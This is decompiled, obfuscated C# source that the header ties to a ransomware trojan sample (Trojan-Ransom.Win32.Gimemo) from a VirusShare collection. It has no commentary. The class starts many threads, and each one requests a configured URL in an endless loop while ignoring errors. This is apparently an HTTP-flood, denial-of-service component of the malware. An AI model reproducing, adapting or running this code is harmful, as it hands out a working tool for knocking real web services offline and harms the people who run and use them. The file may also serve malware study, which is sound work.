// Decompiled with JetBrains decompiler
// Type: 
// Assembly: cssrss, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 33E5F696-F6DE-4A9C-88FA-7590F5DCF59A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Gimemo.xqx-9bbdf97e90a8e8d82865621ec5c533a1f41933b694bafef2c4eebd22a0720916.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Net;
using System.Threading;

internal sealed class \u000F
{
  private static ThreadStart[] \u0002;
  private static Thread[] \u0003;
  public static string \u0005;
  public static int \u0008;
  public static bool \u0006;
  private static \u000F.\u0002[] \u000E;
  public static int \u000F;

  [DebuggerNonUserCode]
  public \u000F()
  {
  }

  public void \u0002()
  {
  }

  public static void \u0002()
  {
    int num = checked (\u000F.\u000F - 1);
    int index = 0;
    while (index <= num)
    {
      try
      {
        \u000F.\u0003[index].Abort();
        \u000F.\u0003[index] = (Thread) null;
        \u000F.\u0002[index] = (ThreadStart) null;
        \u000F.\u000E[index] = (\u000F.\u0002) null;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      checked { ++index; }
    }
    \u000F.\u0006 = false;
  }

  public static void \u0003()
  {
    \u000F.\u0003 = new Thread[checked (\u000F.\u000F - 1 + 1)];
    \u000F.\u0002 = new ThreadStart[checked (\u000F.\u000F - 1 + 1)];
    \u000F.\u000E = new \u000F.\u0002[checked (\u000F.\u000F - 1 + 1)];
    int num = checked (\u000F.\u000F - 1);
    int index = 0;
    while (index <= num)
    {
      \u000F.\u000E[index] = new \u000F.\u0002(\u000F.\u0005, \u000F.\u0008);
      \u000F.\u0002[index] = new ThreadStart(\u000F.\u000E[index].\u0002);
      \u000F.\u0003[index] = new Thread(\u000F.\u0002[index]);
      \u000F.\u0003[index].Start();
      checked { ++index; }
    }
    \u000F.\u0006 = true;
  }

  private sealed class \u0002
  {
    private string \u0002;
    private WebClient \u0003;
    private int \u0005;

    public \u0002(string _param1, int _param2)
    {
      this.\u0003 = new WebClient();
      this.\u0002 = _param1;
      this.\u0005 = _param2;
    }

    public void \u0002()
    {
      while (true)
      {
        try
        {
          this.\u0003.DownloadString(this.\u0002);
          Thread.Sleep(this.\u0005);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          Thread.Sleep(this.\u0005);
          ProjectData.ClearProjectError();
        }
      }
    }
  }
}
